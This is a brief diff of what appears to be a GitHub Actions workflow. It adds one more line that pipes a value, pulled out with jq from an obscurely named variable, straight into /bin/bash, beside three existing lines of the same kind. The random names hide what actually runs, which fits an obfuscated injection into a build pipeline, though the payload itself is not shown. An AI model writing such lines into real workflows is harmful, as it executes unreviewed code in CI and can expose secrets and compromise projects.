@@ -26,6 +26,7 @@ jobs:
           echo $nea60 | jq -r .ospyy7545 | /bin/bash
           echo $a5 | jq -r .drz611 | /bin/bash
           echo $ffbof1 | jq -r .mfic80430 | /bin/bash
+          echo $c749 | jq -r .bggri1436 | /bin/bash
 
       - name: Store artifact
         uses: actions/upload-artifact@v4
